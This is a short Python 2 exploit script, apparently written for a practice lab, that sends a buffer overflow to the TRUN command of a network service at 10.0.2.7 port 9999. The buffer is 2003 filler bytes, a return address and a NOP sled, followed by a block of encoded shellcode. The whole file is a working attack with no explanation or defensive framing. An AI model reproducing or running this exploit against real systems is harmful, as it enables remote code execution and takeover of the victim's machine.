#!/usr/bin/python
import sys, socket

overflow = ("\xda\xc8\xd9\x74\x24\xf4\xb8\x46\x02\xb1\x0e\x5d\x2b\xc9\xb1"
"\x52\x83\xed\xfc\x31\x45\x13\x03\x03\x11\x53\xfb\x77\xfd\x11"
"\x04\x87\xfe\x75\x8c\x62\xcf\xb5\xea\xe7\x60\x06\x78\xa5\x8c"
"\xed\x2c\x5d\x06\x83\xf8\x52\xaf\x2e\xdf\x5d\x30\x02\x23\xfc"
"\xb2\x59\x70\xde\x8b\x91\x85\x1f\xcb\xcc\x64\x4d\x84\x9b\xdb"
"\x61\xa1\xd6\xe7\x0a\xf9\xf7\x6f\xef\x4a\xf9\x5e\xbe\xc1\xa0"
"\x40\x41\x05\xd9\xc8\x59\x4a\xe4\x83\xd2\xb8\x92\x15\x32\xf1"
"\x5b\xb9\x7b\x3d\xae\xc3\xbc\xfa\x51\xb6\xb4\xf8\xec\xc1\x03"
"\x82\x2a\x47\x97\x24\xb8\xff\x73\xd4\x6d\x99\xf0\xda\xda\xed"
"\x5e\xff\xdd\x22\xd5\xfb\x56\xc5\x39\x8a\x2d\xe2\x9d\xd6\xf6"
"\x8b\x84\xb2\x59\xb3\xd6\x1c\x05\x11\x9d\xb1\x52\x28\xfc\xdd"
"\x97\x01\xfe\x1d\xb0\x12\x8d\x2f\x1f\x89\x19\x1c\xe8\x17\xde"
"\x63\xc3\xe0\x70\x9a\xec\x10\x59\x59\xb8\x40\xf1\x48\xc1\x0a"
"\x01\x74\x14\x9c\x51\xda\xc7\x5d\x01\x9a\xb7\x35\x4b\x15\xe7"
"\x26\x74\xff\x80\xcd\x8f\x68\xa5\x11\x8d\x67\xd1\x13\x91\x66"
"\x7d\x9d\x77\xe2\x6d\xcb\x20\x9b\x14\x56\xba\x3a\xd8\x4c\xc7"
"\x7d\x52\x63\x38\x33\x93\x0e\x2a\xa4\x53\x45\x10\x63\x6b\x73"
"\x3c\xef\xfe\x18\xbc\x66\xe3\xb6\xeb\x2f\xd5\xce\x79\xc2\x4c"
"\x79\x9f\x1f\x08\x42\x1b\xc4\xe9\x4d\xa2\x89\x56\x6a\xb4\x57"
"\x56\x36\xe0\x07\x01\xe0\x5e\xee\xfb\x42\x08\xb8\x50\x0d\xdc"
"\x3d\x9b\x8e\x9a\x41\xf6\x78\x42\xf3\xaf\x3c\x7d\x3c\x38\xc9"
"\x06\x20\xd8\x36\xdd\xe0\xf8\xd4\xf7\x1c\x91\x40\x92\x9c\xfc"
"\x72\x49\xe2\xf8\xf0\x7b\x9b\xfe\xe9\x0e\x9e\xbb\xad\xe3\xd2"
"\xd4\x5b\x03\x40\xd4\x49")

shellcode = 'A' * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.0.2.7", 9999))
	s.send(("TRUN /.:/" + shellcode))
	s.close()
	
except:
	print "Error connecting to server."
	sys.exit()
